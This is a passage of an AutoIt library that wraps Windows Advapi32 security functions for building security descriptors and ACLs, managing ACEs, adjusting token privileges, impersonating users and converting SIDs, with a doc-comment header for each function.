	If IsArray($aAudit) Then $pSACL = _InitializeExplicitAccess($aAudit)
	If $sOwner Then $pOwner = _InitializeTrustee($sOwner)
	If $sGroup Then $pGroup = _InitializeTrustee($sGroup)

	If IsArray($aAccess) And Not $pDacl Then Return SetError(87, 1, 0)
	If IsArray($aAudit) And Not $pSACL Then Return SetError(87, 2, 0)
	If $sOwner <> "" And Not $pOwner Then Return SetError(87, 3, 0)
	If $sGroup <> "" And Not $pGroup Then Return SetError(87, 4, 0)
	If $pOldSd And Not _IsValidSecurityDescriptor($pOldSd) Then Return SetError(87, 5, 0)

	$iResult = DllCall("Advapi32.dll", "dword", "BuildSecurityDescriptor", _
			"ptr", $pOwner, "ptr", $pGroup, _
			"ulong", Ubound($aAccess), "ptr", $pDacl, _
			"ulong", Ubound($aAudit), "ptr", $pSacl, _
			"ptr", $pOldSd, "ulong*", 0, "ptr*", 0)
	If $pOwner Then _HeapFree($pOwner)
	If $pGroup Then _HeapFree($pGroup)
	If $pDacl Then _HeapFree($pDacl)
	If $pSACL Then _HeapFree($pSACL)
	Return SetError($iResult[0], $iResult[8], $iResult[9])
EndFunc	;==>_BuildSecurityDescriptor

; #### FUNCTION ####
; =======================================================================
; Name	: _InitializeTrustee
; Description	: This function initializes a tagTRUSTEE structure.
; Parameter(s)	: $pSid	- Either a SID pointer to an user account, or a string contains the user account's name.
; Return values	: If $pSid is a valid pointer or a valid user account string, return value is a pointer a tagTRUSTEE structure, otherwise, the return value is set to zero, and @error is set to ERROR_INVALID_PARAMETER.
; Author	: Pusofalse
; Remarks		: When you finished with this pointer, call _HeapFree function to free it.
; =======================================================================
Func _InitializeTrustee($pSid)
	Local $iResult, $tTRUSTEE, $pTRUSTEE

	If Not _IsValidSid($pSid) Then
		$pSid = _LookupAccountName($pSid)
		If Not _IsValidSid($pSid) Then Return SetError(87, 1, 0)
	EndIf
	$pTRUSTEE = _HeapAlloc(20)
	$tTRUSTEE = DllStructCreate($tagTRUSTEE, $pTRUSTEE)
	DllStructSetData($tTRUSTEE, "From", $TRUSTEE_IS_SID)
	DllStructSetData($tTRUSTEE, "Name", $pSid)
	Return $pTRUSTEE
EndFunc	;==>_InitializeTrustee

; #### FUNCTION ####
; =======================================================================
; Name	: _InitializeExplicitAccess
; Description	: The function intializes a tagEXPLICITACCESS structure by using the data caller specified.
; Parameters	: $aAccess	- An array with following format:
;		:	- $aAccess[0][0] - Either an user account name or an user account SID pointer.
;		:	- $aAccess[0][1] - The user's access rights assigned to the first account specified in $aAccess[0][0].
;		:	- $aAccess[0][2] - The access type, see ACCESS TYPE CONSTANTS for a value.
;		:	- $aAccess[0][3] - The inheritance options, see INHERITANCE CONSTANTS for a value.
;		:	- $aAccess[1][0] - The second usr account, can be either an user name or an user account SID pointer.
;		:	- $aAccess[1][1] - The user's access rights assigned to the second account specified in $aAccess[1][0].
;		:	- $aAccess[1][2] - Access type.
;		:	- $aAccess[1][3] - Inheritance options, can be NO_INHERITANCE.
;		:	- ... ...
; Return values	: If succeeds, the function returns a pointer to an array of tagEXPLICITACCESS structure, otherwise, returns zero, and sets @error to non-zero.
; Author		: Pusofalse
; Remarks		: When you no longer use this pointer, call _HeapFree function to free it.
; =======================================================================
Func _InitializeExplicitAccess($aAccess)
	Local $tAccess, $pAccess, $iSizeofAccess, $tagAccess, $pSid

	If Ubound($aAccess, 0) <> 2 Then Return SetError(13, 0, 0)
	If Ubound($aAccess, 2) <> 4 Then Return SetError(13, 0, 0)

	$tAccess = DllStructCreate($tagEXPLICITACCESS)
	$iSizeOfAccess = DllStructGetSize($tAccess)
	$pAccess = _HeapAlloc($iSizeofAccess * Ubound($aAccess))
	_FreeVariable($tAccess)
	For $i = 1 to Ubound($aAccess)
		$tagAccess &= "dword[3];ptr;int[3];ptr;"
	Next
	$tAccess = DllStructCreate($tagAccess, $pAccess)
	For $i = 0 to Ubound($aAccess) - 1
		If _IsValidSid($aAccess[$i][0]) Then
			$pSid = $aAccess[$i][0]
		Else
			$pSid = _LookupAccountName($aAccess[$i][0])
			If Not _IsValidSid($pSid) Then
				_HeapFree($pAccess)
				_FreeVariable($tAccess)
				Return SetError($ERROR_INVALID_SID, $i, 0)
			EndIf
		EndIf
		DllStructSetData($tAccess, $i * 4 + 4, $pSid)
		DllStructSetData($tAccess, $i * 4 + 1, $aAccess[$i][1], 1)
		DllStructSetData($tAccess, $i * 4 + 1, $aAccess[$i][2], 2)
		DllStructSetData($tAccess, $i * 4 + 1, $aAccess[$i][3], 3)
		DllStructSetData($tAccess, $i * 4 + 3, $TRUSTEE_IS_SID, 2)
	Next
	Return $pAccess
EndFunc	;==>_InitializeExplicitAccess

; #### FUNCTION ####
; =======================================================================
; Name	: _SetEntriesInAcl1
; Description	: Creates an access control list (ACL) pointer by using the information the caller specified.
; Parameter(s)	: $pUserSid	- Either an user account SID pointer or an user account name string.
;		: $iAccess		- The access mask value as the user access rights assigned to $pUserSid user account.
;		: $iAccessType	- A value of ACCESS TYPE CONSTANTS.
;		: $iInheritOpt	- Inheritance options, see INHERITANCE OPTIONS for a value.
;		: $pAcl		- An existing ACL pointer, if non-zero, the function creates a new ACL pointer by merging the $pACL ACL pointer.
; Return values	: If succeeds, the return value is a pointer to the newly created access control list, otherwise, returns zero, and sets @error to a system error code.
; Author		: Pusofalse
; Remarks		: When you no longer use this pointer, call _LsaLocalFree to free it.
; =======================================================================
Func _SetEntriesInAcl1($pUserSid, $iAccess, $iAccessType, $iInheritOpt = 0, $pAcl = 0)
	Local $pNewAcl, $tAccess, $pAccess, $iFlag

	If Not _IsValidSid($pUserSid) Then
		$pUserSid = _LookupAccountName($pUserSid)
		If Not _IsValidSid($pUserSid) Then Return SetError(@error, 0, 0)
		$iFlag = 1
	EndIf
	_LookupAccountSid($pUserSid)
	$iType = @Extended
	$tAccess = DllStructCreate($tagEXPLICITACCESS)
	$pAccess = DllStructGetPtr($tAccess)
	DllStructSetData($tAccess, "AccessMask", $iAccess)
	DllStructSetData($tAccess, "AccessMode", $iAccessType)
	DllStructSetData($tAccess, "Inheritance", $iInheritOpt)
	DllStructSetData($tAccess, "From", $TRUSTEE_IS_SID)
	DllStructSetData($tAccess, "Type", $iType)
	DllStructSetData($tAccess, "Name", $pUserSid)

	$iResult = DllCall("Advapi32.dll", "dword", "SetEntriesInAcl", _
			"ulong", 1, "ptr", $pAccess, "ptr", $pAcl, "ptr*", 0)
	If $iFlag Then _HeapFree($pUserSid)
	Return SetError($iResult[0], _FreeVariable($tAccess), $iResult[4])
EndFunc	;==>_SetEntriesInAcl1

; #### FUNCTION ####
; =======================================================================
; Name	: _SetEntriesInAcl
; Description	: Creates an access control list (ACL) pointer by using the information the caller specified in an array.
; Parameter(s)	: $aAccess	- An array with following format:
;		:	- $aAccess[0][0] - The owner of the first entry.
;		:	- $aAccess[0][1] - The access rights value assigned to the first owner.
;		:	- $aAccess[0][2] - The access mode, DENY_ACCESS or GRANT_ACCESS is defined in DACL, SET_AUDIT_SUCCESS or SET_AUDIT_FAILURE is defined in SACL.
;		:	- $aAccess[0][3] - The inheritance options, see INHERITANCE CONSTANTS for possible values, default to NO_INHERITANCE
;		:	- $aAccess[1][0] - The owner of the second entry.
;		:	- ... ...
;		: $pOldAcl	- An existing ACL pointer, if non-zero, the function creates a new ACL pointer by merging the $pACL ACL pointer.
; Return values	: If succeeds, returns a pointer to an acceess control list, must pass to _LsaLocalFree function to free it after finishing with it. If fails, returns zero and sets @error to a system error code.
; Author	: Pusofalse
; =======================================================================
Func _SetEntriesInAcl($aAccess, $pOldAcl = 0)
	Local $pAcl, $pAccess

	If Ubound($aAccess, 0) <> 2 Then Return SetError(13, 0, 0)
	If Ubound($aAccess, 2) <> 4 Then Return SetError(13, 0, 0)

	$pAccess = _InitializeExplicitAccess($aAccess)
	If @error or $pAccess = 0 Then Return SetError(@error, 0, 0)
	$pAcl = DllCall("Advapi32.dll", "dword", "SetEntriesInAcl", _
			"ulong", Ubound($aAccess), "ptr", $pAccess, _
			"ptr", $pOldAcl, "ptr*", 0)
	_HeapFree($pAccess)
	Return SetError($pAcl[0], 0, $pAcl[4])
EndFunc	;==>_SetEntriesInAcl

; #### FUNCTION ####
; =======================================================================
; Name	: _SetAccessControlEntriesOrder
; Description	: This function changes the order of the ACEs in an ACL.
; Parameter(s)	: $pAcl	- A pointer to an access control list (ACL).
;		: $vOrder	- Specifies the order, if is an array, it must be in the following format:
;		:	- $vOrder[0] - The index (zero-based) of the first ACE.
;		:	- $vOrder[1] - The index (zero-based) of the second ACE.
;		: ... ...
;		: If is in string format, $vOrder must be in the form:
;		:	- 1st ace|2nd ace|3rd ace|...|nth ace
;		:	- (Each index is splitted by using the '|') 
; Return values	: True indicates success, false indicates failure.
; Author	: Pusofalse
; Remarks	: When you finished with the $pAcl pointer, call _HeapFree function to free it.
; =======================================================================
Func _SetAccessControlEntriesOrder(ByRef $pAcl, $vOrder)
	Local $iSize, $iNum, $pNewAcl, $aOrder

	If Not _IsValidAcl($pAcl) Then Return SetError(@error, 0, 0)
	If IsArray($vOrder) Then
		If Ubound($aOrder, 0) <> 1 Then Return SetError(87, 0, 0)
		$aOrder = $vOrder
	Else
		$aOrder = StringRegExp($vOrder, "(\d+)\|?", 3)
	EndIf
	$iSize = _GetAclInformation($pAcl)
	$iNum = @extended
	$iSize = bitAND($iSize, 0xFFFF)
	If $iSize < 1 Then Return SetError(13, 0, 0)
	If Ubound($aOrder) <> $iNum Then Return SetError(87, 0, 0)

	$pNewAcl = _HeapAlloc($iSize)
	If _InitializeAcl($pNewAcl, $iSize) = 0 Then Return SetError(@error, 0, 0)
	For $i = 0 to Ubound($aOrder) - 1
		If $aOrder[$i] > $iNum - 1 Then Return SetError(13, 0, 0)
		If _AddAceEx($pNewAcl, _GetAce($pAcl, $aOrder[$i]), $i) = 0 Then
			Return SetError(@error, _HeapFree($pNewAcl), 0)
		EndIf
	Next
	$pAcl = $pNewAcl
	Return SetExtended(_FreeVariable($aOrder), 1)
EndFunc	;==>_SetAccessControlEntriesOrder

Func _ImpersonateLoggedOnUser($hToken)
	Local $iResult = DllCall("Advapi32.dll", "int", "ImpersonateLoggedOnUser", "hWnd", $hToken)
	Return SetError(_GetLastError(), 0, $iResult[0] <> 0)
EndFunc	;==>_ImpersonateLoggedOnUser

Func _RevertToSelf()
	Local $iResult = DllCall("Advapi32.dll", "int", "RevertToSelf")
	Return SetError(_GetLastError(), 0, $iResult[0] <> 0)
EndFunc	;==>_RevertToSelf

Func _GetAuditedPermissionsFromAcl($pAcl, $pSid)
	Local $iResult, $iFlag, $hToken
	Local $aPriv[1][2] = [[$SE_SECURITY_NAME, 2]]

	If Not _IsValidAcl($pAcl) Then Return SetError(@error, 0, 0)
	If Not _IsValidSid($pSid) Then
		$pSid = _LookupAccountName($pSid)
		If Not _IsValidSid($pSid) Then Return SetError(@error, 0, 0)
		$iFlag = 1
	EndIf
	$tTRUSTEE = DllStructCreate($tagTRUSTEE)
	$pTRUSTEE = DllStructGetPtr($tTRUSTEE)
	DllStructSetData($tTRUSTEE, "From", $TRUSTEE_IS_SID)
	DllStructSetData($tTRUSTEE, "Name", $pSid)

	$hToken = _OpenProcessToken(-1)
	If Not _IsPrivilegeEnabled($hToken, $SE_SECURITY_NAME) Then
		_AdjustTokenPrivileges($hToken, $aPriv)
	EndIf
	_LsaCloseHandle($hToken)
	$iResult = DllCall("Advapi32.dll", "dword", "GetAuditedPermissionsFromAcl", _
			"ptr", $pAcl, "ptr", $pTrustee, "dword*", 0, "dword*", 0)
	If $iFlag Then _HeapFree($pSid)
	_FreeVariable($tTrustee)
	Return SetError($iResult[0], $iResult[3], "0x" & Hex($iResult[4]))
EndFunc	;==>_GetAuditedPermissionsFromAcl

; #### FUNCTION ####
; =======================================================================
; Name	: _GetEffectiveRightsFromAcl
; Description	: Retrieves the access mask value for the user from the specified access control list (ACL).
; Parameter(s)	: $pAcl	- A pointer to an access control list.
;		: $pUserSid	- Either an user account name string or an user account SID.
; Return values	: If succeeds, returns the access right masks value assigned to $pUserSid. If fails, returns -1 and sets @error to a system error code.
; Author	: Pusofalse
; =======================================================================
Func _GetEffectiveRightsFromAcl($pAcl, $pUserSid)
	Local $iResult, $tTRUSTEE, $pTRUSTEE, $iFlag

	If Not _IsValidSid($pUserSid) Then
		$pUserSid = _LookupAccountName($pUserSid)
		If Not _IsValidSid($pUserSid) Then Return SetError(@error, 0, -1)
		$iFlag = 1
	EndIf
	$tTRUSTEE = DllStructCreate($tagTRUSTEE)
	$pTRUSTEE = DllStructGetPtr($tTRUSTEE)
	DllStructSetData($tTRUSTEE, "From", $TRUSTEE_IS_SID)
	DllStructSetData($tTRUSTEE, "Name", $pUserSid)
	$iResult = DllCall("Advapi32.dll", "dword", "GetEffectiveRightsFromAcl", _
			"ptr", $pAcl, "ptr", $pTRUSTEE, "dword*", 0)
	If $iFlag Then _HeapFree($pUserSid)
	Return SetError($iResult[0], _FreeVariable($tTRUSTEE), "0x" & Hex($iResult[3]))
EndFunc	;==>_GetEffectiveRightsFromAcl

; #### FUNCTION ####
; =======================================================================
; Name	: _IsPrivilegeEnabled
; Description	: The function checks the specified privilege whether is enabled in the access token.
; Parameter(s)	: $hToken		- Handle to the access token.
;		: $sPrivilege	- The name of the privilege, see PRIVILEGE CONSTANTS for a value.
; Return values	: If the $sPrivilege is enabled in $hToken, returns true, otherwise returns false.
; Author	: Pusofalse
; =======================================================================
Func _IsPrivilegeEnabled($hToken, $sPrivilege)
	Local $iResult, $tLuid, $pLuid, $tPrivSet, $pPrivSet, $vNul

	$pLuid = _LookupPrivilegeValue($sPrivilege)
	$tLuid = DllStructCreate($tagLuid, $pLuid)
	$tPrivSet = DllStructCreate($tagPRIVILEGESET)
	$pPrivSet = DllStructGetPtr($tPrivSet)
	DllStructSetData($tPrivSet, "Count", 1)
	DllStructSetData($tPrivSet, "Low", DllStructGetData($tLuid, "Low"))
	DllStructSetData($tPrivSet, "High", DllStructGetData($tLuid, "High"))
	$iResult = DllCall("Advapi32.dll", "int", "PrivilegeCheck", _
			"hWnd", $hToken, "ptr", $pPrivSet, "int*", 0)
	_HeapFree($pLuid)
	_FreeVariable($tLuid)
	_FreeVariable($tPrivSet)
	Return $iResult[3] <> 0
EndFunc	;==>_IsPrivilegeEnabled

; #### FUNCTION #### $tagTOKENPRIVILEGE
; =======================================================================
; Name	: _AdjustTokenPrivileges
; Description	: The function enables or disables the privileges of specified access token.
; Parameter(s)	: $hToken	- Handle to the access token.
;		: $aPrivilege	- An array with following format:
;		:		- $aPrivilege[0][0] - The name of the first privilege.
;		:		- $aPrivilege[0][1] - The first privilege's state.
;		:		- $aPrivilege[1][0] - The second privilege's name.
;		:		- $aPrivilege[1][1] - The second privilege's state.
;		:		- ... ...
;		: $fDisableAll	- If true, the function ignores the $aPrivilege parameter, and disables all privileges for $hToken.
; Return values	: True indicates success, false to failure, and sets @error to a system error code.
; Author	: Pusofalse
; =======================================================================
Func _AdjustTokenPrivileges($hToken, $aPrivilege, $fDisableAll = 0)
	Local $iResult, $tTokenPriv, $pTokenPriv, $iSysError
	Local $pLuid, $tLuid, $tagTP, $pPrivState, $iSizeofBuffer

	If $fDisableAll = 0 And Ubound($aPrivilege, 0) <> 2 Then Return SetError(@ERROR, 0, 0)
	For $i = 0 to Ubound($aPrivilege) - 1
		$tagTP &= ";dword;long;dword"
	Next
	$tTokenPriv = DllStructCreate("dword" & $tagTP)
	$pTokenPriv = DllStructGetPtr($tTokenPriv)
	DllStructSetData($tTokenPriv, 1, Ubound($aPrivilege))
	For $i = 0 to Ubound($aPrivilege) - 1
		$pLuid = _LookupPrivilegeValue($aPrivilege[$i][0])
		$tLuid = DllStructCreate($tagLUID, $pLuid)
		DllStructSetData($tTokenPriv, $i * 3 + 2, DllStructGetData($tLuid, "Low"))
		DllStructSetData($tTokenPriv, $i * 3 + 3, DllStructGetData($tLuid, "High"))
		DllStructSetData($tTokenPriv, $i * 3 + 4, $aPrivilege[$i][1])
		_HeapFree($pLuid)
		_FreeVariable($tLuid)
	Next
	$iSizeofBuffer = DllStructGetSize($tTokenPriv)
	$pPrivState = _HeapAlloc( $iSizeofBuffer )
	$iResult = DllCall("Advapi32.dll", "int", "AdjustTokenPrivileges", _
			"hWnd", $hToken, "int", $fDisableAll, _
			"ptr", $pTokenPriv, "dword", $iSizeofBuffer, _
			"ptr", $pPrivState, "dword*", $iSizeofBuffer)
	$iSysError = _GetLastError()
	_FreeVariable($tTokenPriv)
	Return SetError($iSysError, _HeapFree($pPrivState), $iResult[0] <> 0)
EndFunc	;==>_AdjustTokenPrivilege

; #### FUNCTION ####
; =======================================================================
; Name	: _DeleteAce
; Description	: The _DeleteAce function deletes an access control entry (ACE) from an access control list (ACL).
; Parameter(s)	: $pAcl	- A pointer to an access control list.
;		: $iIndex	- Zero-based ACE index to be deleted, call _GetAclInformation for the number of ACE.
; Return values	: If succeeded, returned true, otherwise returned false, and set @error to a system error code.
; Author		: Pusofalse
; =======================================================================
Func _DeleteAce(ByRef $pAcl, $iIndex)
	Local $iResult
	If Not _IsValidAcl($pAcl) Then Return SetError(@error, 0, 0)
	$iResult = DllCall("Advapi32.dll", "int", "DeleteAce", "ptr", $pAcl, "int", $iIndex)
	Return SetError(_GetLastError(), 0, $iResult[0] <> 0)
EndFunc	;==>_DeleteAce

; #### FUNCTION ####
; =======================================================================
; Name	: _DeleteAceByOwner
; Description	: Deletes an access control entry from an access control list by using the owner of the call specified.
; Parameter(s)	: $pAcl	- A pointer to a ACL (access control list) structure from which the ACE is deleted.
;		: $pSid	- Either an user account SID or an user account name string.
;		: $fDeleteAll	- If true, the function deletes all the ACEs which the owner is $pSid. Default to true.
; Return values	: If succeeds, returns true, else returns false.
; Author	: Pusofalse
; =======================================================================
Func _DeleteAceByOwner(ByRef $pAcl, $pSid, $fDeleteAll = True)
	Local $iResult, $aAceList, $pSid2

	If Not _IsValidSid($pSid) Then $pSid = _LookupAccountName($pSid)
	If Not _IsValidSid($pSid) Then Return SetError(@error, 0, 0)
	If Not _IsValidAcl($pAcl) Then Return SetError(@error, 0, 0)
	$aAceList = _GetExplicitEntriesFromAcl($pAcl)
	For $i = 1 to $aAceList[0][0]
		$pSid2 = _LookupAccountName($aAceList[$i][0])
		If _EqualSid($pSid, $pSid2) Then
			$iResult = _DeleteAce($pAcl, $i - 1)
			If $fDeleteAll = False Then ExitLoop
		EndIf
		_HeapFree($pSid2)
	Next
	_HeapFree($pSid)
	Return $iResult
EndFunc	;==>_DeleteAceByOwner

; #### FUNCTION ####
; =======================================================================
; Name	: _GetAce
; Description	: Retrieves an access control entry (ACE) pointer from an access control list.
; Parameter(s)	: $pAcl	- A pointer to an access control list.
;		: $iIndex	- Zero-based ACE index to be retrieved.
; Return values	: If succeed, return a pointer to a specified ACE, otherwise return zero and set @error to a system error code.
; Author		: Pusofalse
; =======================================================================
Func _GetAce(ByRef $pAcl, $iIndex)
	Local $pAce
	If Not _IsValidAcl($pAcl) Then Return SetError(@error, 0, 0)
	$pAce = DllCall("Advapi32.dll", "int", "GetAce", "ptr", $pAcl, _
			"int", $iIndex, "ptr*", 0)
	If $pAce[3] Then
		$__LSA_ACE_INDEX_CURRENT_SELECT = $iIndex
		$__LSA_ACE_POINTER_CURRENT_SELECT = $pAce[3]
		$__LSA_ACL_POINTER_CURRENT_SELECT = $pAcl
	Else
		$__LSA_ACE_INDEX_CURRENT_SELECT = -1
		$__LSA_ACE_POINTER_CURRENT_SELECT = 0
		$__LSA_ACL_POINTER_CURRENT_SELECT = 0
	EndIf
	Return SetError(_GetLastError(), 0, $pAce[3])
EndFunc	;==>_GetAce

; #### FUNCTION ####
; =======================================================================
; Name	: _GetExplicitAce
; Description	: Retrieves an array contains the access control entry (ACE) information.
; Parameter(s)	: $pAce	- A pointer to an access control entry (ACE), returned by _GetAce function.
; Return values	: If succeed, return an array with following format:
;		:	- $aArray[0]	- The owner of the access control entry.
;		:	- $aArray[1]	- The owner SID of the access control entry, in string format.
;		:	- $aArray[2]	- The access mask.
;		:	- $aArray[3]	- The access type.
;		:	- $aArray[4]	- The inheritance options.
;		: If fail, all elements are to NULL, and sets @error to system error code.
; Author	: Pusofalse
; =======================================================================
Func _GetExplicitAce($pAce)
	Local $aEntry, $aResult[5]

	If $__LSA_ACL_POINTER_CURRENT_SELECT = 0 Then Return SetError($ERROR_INCORRECT_FUNCTION, 0, $aResult)
	If _GetAce($__LSA_ACL_POINTER_CURRENT_SELECT, $__LSA_ACE_INDEX_CURRENT_SELECT) <> $pAce Then
		Return SetError($ERROR_INCORRECT_FUNCTION, 0, $aResult)
	EndIf
	$aEntry = _GetExplicitEntriesFromAcl($__LSA_ACL_POINTER_CURRENT_SELECT)
	If $__LSA_ACE_INDEX_CURRENT_SELECT > $aEntry[0][0] Then Return SetError($ERROR_INVALID_PARAMETER, 0, $aResult)
	For $i = 0 to 4
		$aResult[$i] = $aEntry[$__LSA_ACE_INDEX_CURRENT_SELECT + 1][$i]
	Next
	Return $aResult
EndFunc	;==>_GetExplicitAce

; #### FUNCTION ####
; =======================================================================
; Name	: _AddAce
; Description	: The function adds an access control entry (ACE) into an access control list (ACL).
; Parameter(s)	: $pAcl	- An ACL pointer to which the ACE is added to.
;		: $pAce	- An ACE pointer which the function adds to.
; Return values	: If success, return true, else return false and set @error to non-zero.
; Author		: Pusofalse
; Remarks		: The $pAce parameter is returned by _GetAce function, but the $pAce can not be from $pAcl pointer, otherwise, the function returns zero, and sets @error to ERROR_SAME_ACL (-1).
; =======================================================================
Func _AddAce(ByRef $pAcl, $pAce)
	Local Const $ERROR_SAME_ACL = -1
	Local $aData = _GetExplicitAce($pAce)
	If @error Then Return SetError(@error, _FreeVariable($aData), 0)
	If $pAcl = $__LSA_ACL_POINTER_CURRENT_SELECT Then Return SetError($ERROR_SAME_ACL, 0, 0)
	$pAcl = _SetEntriesInAcl1($aData[0],$aData[2], $aData[3], $aData[4], $pAcl)
	Return SetError(@error, 0, @error = 0)
EndFunc	;==>_AddAce

; #### FUNCTION ####
; =======================================================================
; Name	: _AddAceEx1
; Description	: This function adds an access control entry to an access control list.
; Parameter(s)	: $pAcl	- A variable of pointer to an access control list to which the access control entry is added.
;		: $aAce	- An array in the following format:
;		:	- $aAce[0] - The owner of the ACE.
;		:	- $aAce[1] - Access rights assigned to the owner.
;		:	- $aAce[2] - Access type, GRANT_ACCESS and DENY_ACCESS are defined in DACL.
;		:	- $aAce[3] - Inheritance options, can be NO_INHERITANCE (0).
;		: $iStartIndex	- Specifies the position in the ACL's list of ACEs at which to add the new ACEs. A value of zero inserts the ACEs at the beginning of the list. A value of MAXDWORD (-1) appends the ACEs to the end of the list.
;		: $iSizeofAce	- Specifies the size of the ACE, the calculation formula of the size of the ACE is following:
;		:	DllStructGetSize($tACCESSACE) + _GetLengthSid($pAceOwnerSid) - 4.
;		: $iRevision	- Revision level, can be ACL_REVISION or ACL_REVISION_DS, default to ACL_REVISION (2).
; Return values	: Returns true if succeeds, else returns false indicates failure, in which case, @error is set to a system error code.
; Author	: Pusofalse
; Remarks	: If the size of the access control list is not enough large to store the new access control entry, the function fails and sets @error to ERROR_INSUFFICIENT_BUFFER (122), indicates a larger memory area for the access control list is requested.
; =======================================================================
Func _AddAceEx1(ByRef $pAcl, $aAce, $iStartIndex, $iSizeofAce = -1, $iRevision = 2)
	Local $iResult, $pNewAcl, $pAce, $aAceList[1][4]

	If Not _IsValidAcl($pAcl) Then Return SetError(@error, 0, 0)
	If Ubound($aAce, 0) <> 1 Then Return SetError($ERROR_INVALID_PARAMETER, 0, 0)
	If Ubound($aAce, 1) <> 4 Then Return SetError($ERROR_INVALID_PARAMETER, 0, 0)

	For $i = 0 to 3
		$aAceList[0][$i] = $aAce[$i]
	Next
	$pNewAcl = _SetEntriesInAcl($aAceList, 0)
	If @error OR $pNewAcl = 0 OR Not _IsValidAcl($pNewAcl) Then Return SetError(@error, 0, 0)
	$pAce = _GetAce($pNewAcl, 0)
	$iResult = _AddAceEx($pAcl, $pAce, $iStartIndex, $iSizeofAce, $iRevision)
	Return SetError(@error, _LsaLocalFree($pNewAcl), $iResult)
EndFunc	;==>_AddAceEx1

; #### FUNCTION ####
; =======================================================================
; Name	: _AddAceEx
; Description	: This function adds one or more access control entries (ACEs) to a specified access contol list.
; Parameter(s)	: $pAcl	- A pointer to an ACL. This function adds an ACE to this ACL.
;		: $pAce	- A pointer to an ACE, or ACEs' list.
;		: $iStartIndex	- Specifies the position at which to add the ACEs' list, zero indicates the beginning of the list, -1 indicates the end of the list.
;		: $iSizeofAce	- Specifies the size of the ACE, the calculation formula of the size of one ACE is following:
;		:	DllStructGetSize($tACCESSACE) + _GetLengthSid($pAceOwnerSid) - 4.
;		: $iRevision	- Revision level. This value can be ACL_REVISION or ACL_REVISION_DS. Use ACL_REVISION_DS if the ACL contains object-specific ACEs. This value must be compatible with the AceType field of all ACEs in pAceList. Otherwise, the function will fail and return STATUS_INVALID_PARAMETER. 
; Return values	: If succeeds, returns true. Otherwise returns false and sets @error to a system error code.
; Author	: Pusofalse
; Remarks	: If $pAcl is not large enough to store the new acess control entry, the function fails and sets @error to ERROR_INSUFFICIENT_BUFFER (122), means a larger area is requested.
; =======================================================================
Func _AddAceEx(ByRef $pAcl, $pAce, $iStartIndex, $iSizeofAce = -1, $iRevision = 2)
	Local $iResult

	If Not _IsValidAcl($pAcl) Then Return SetError(@error, 0, 0)
	If Not _IsValidAce($pAce) Then Return SetError(@error, 0, 0)
	If $iSizeofAce = -1 Then
		Local $tAce = DllStructCreate($tagACCESSACE, $pAce)
		$iSizeofAce = DllStructGetData($tAce, "AceSize")
	EndIf
	$iResult = DllCall("Advapi32.dll", "int", "AddAce", "ptr", $pAcl, _
			"dword", $iRevision, "dword", $iStartIndex, _
			"ptr", $pAce, "dword", $iSizeofAce)
	Return SetError(_GetLastError(), 0, $iResult[0] <> 0)
EndFunc	;==>_AddAceEx

; #### FUNCTION ####
; =======================================================================
; Name	: _IsValidAce
; Description	: Validates an access control entry.
; Parameter(s)	: $pAce	- A pointer to an access control entry, returned by _GetAce function.
; Return values	: If $pAce is a valid pointer to an access control entry, returns true, else returns false and sets @error to ERROR_INCORRECT_FUNCTION.
; Author	: Pusofalse
; =======================================================================
Func _IsValidAce($pAce)
	If $__LSA_ACL_POINTER_CURRENT_SELECT = 0 Then Return SetError($ERROR_INCORRECT_FUNCTION, 0, 0)
	If _GetAce($__LSA_ACL_POINTER_CURRENT_SELECT, $__LSA_ACE_INDEX_CURRENT_SELECT) <> $pAce Then
		Return SetError($ERROR_INCORRECT_FUNCTION, 0, 0)
	EndIf
	Return SetError(0, 0, 1)
EndFunc	;==>_IsValidAce

; #### FUNCTION ####
; =======================================================================
; Name	: _AccessCheck
; Description	: Determines whether a security descriptor grants a specified set of access rights to the client identified by an access token.
; Parameter(s)	: $pSecurDesc	- A pointer to a security descriptor against which access is checked.
;		: $iDesiredAccess	- A DWORD value of access mask that specifies the access rights to check.
; Return values	: If no errors occur and the security descriptor allows the requested access rights to the current client identifer, the function returns the granted access rights (same to the value of $iDesiredAccess parameter), otherwise, the function returns zero and sets @error.
; Author	: Pusofalse
; =======================================================================
Func _AccessCheck($pSecurDesc, $iDesiredAccess)
	Local $iResult, $hThread, $hToken, $pMap, $pPrivSet, $iSysError

	If Not _IsValidSecurityDescriptor($pSecurDesc) Then Return SetError(@error, 0, 0)
	$iResult = DllCall("Advapi32.dll", "int", "ImpersonateSelf", "int", 2)
	If $iResult[0] = 0 Then Return SetError(_GetLastError(), 0, 0)

	$hThread = DllCall("Kernel32.dll", "hWnd", "GetCurrentThread")
	$iResult = DllCall("Advapi32.dll", "int", "OpenThreadToken", "hWnd", $hThread[0], _
			"dword", $TOKEN_QUERY, "int", 0, "hWnd*", 0)
	If $iResult[4] = 0 Then Return SetError(_GetLastError(), _RevertToSelf(), 0)

	$hToken = $iResult[4]
	$pMap = _HeapAlloc(0x10)
	$pPrivSet = _HeapAlloc(20)
	$iResult = DllCall("Advapi32.dll", "int", "AccessCheck", "ptr", $pSecurDesc, _
			"hWnd", $hToken, "dword", $iDesiredAccess, "ptr", $pMap, _
			"ptr", $pPrivSet, "dword*", 20, "dword*", 0, "dword*", 0)
	If $iResult[0] = 0 Then $iSysError = _GetLastError()
	_RevertToSelf()
	_LsaCloseHandle($hToken)
	Return SetError($iSysError, _HeapFree($pMap)*_HeapFree($pPrivSet), $iResult[7])
EndFunc	;==>_AccessCheck

; #### FUNCTION ####
; =======================================================================
; Name	: _ConvertSidToStringSid
; Description	: Converts a SID pointer to a string SID.
; Parameter(s)	: $pSid	- A pointer to a SID.
; Return values	: If succeeds, the return value is a string in the form: x-x-x...
;		: If fails, the return value is set to empty and sets @error to ERROR_INVALID_SID.
; Author		: Pusofalse
; =======================================================================
Func _ConvertSidToStringSid($pSid)
	Local $iResult, $tBuffer, $iSysError, $sResult

	If Not _IsValidSid($pSid) Then Return SetError(@error, 0, "")
	$iResult = DllCall("Advapi32.dll", "int", "ConvertSidToStringSid", _
			"ptr", $pSid, "ptr*", 0)
	If $iResult[0] = 0 Then $iSysError = _GetLastError()
	If $iResult[2] = 0 Then Return SetError($iSysError, 0, "")
	$tBuffer = DllStructCreate("char[256]", $iResult[2])
	$sResult = DllStructGetData($tBuffer, 1)
	_LsaLocalFree($iResult[2])
	Return SetError($iSysError, _FreeVariable($tBuffer), $sResult)
EndFunc	;==>_ConvertSidToStringSid

; #### FUNCTION ####
; =======================================================================
; Name	: _ConvertStringSidToSid
; Description	: This function converts a SID string to a SID pointer.
; Parameter(s)	: $sStringSid	- A SID string in the form: x-x-x...
